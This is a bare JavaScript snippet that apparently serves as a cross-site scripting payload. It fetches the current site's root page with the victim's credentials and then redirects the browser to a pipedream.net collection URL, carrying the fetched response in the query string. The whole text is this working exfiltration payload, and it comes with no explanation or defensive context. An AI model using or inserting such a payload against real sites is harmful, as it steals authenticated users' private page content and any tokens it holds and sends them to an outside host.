var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
   document.location.replace('https://eo6idxeb7noua1k.m.pipedream.net?q='+xhr.response);
}
xhr.open('GET','/',true);
xhr.withCredentials = true;xhr.send(null);
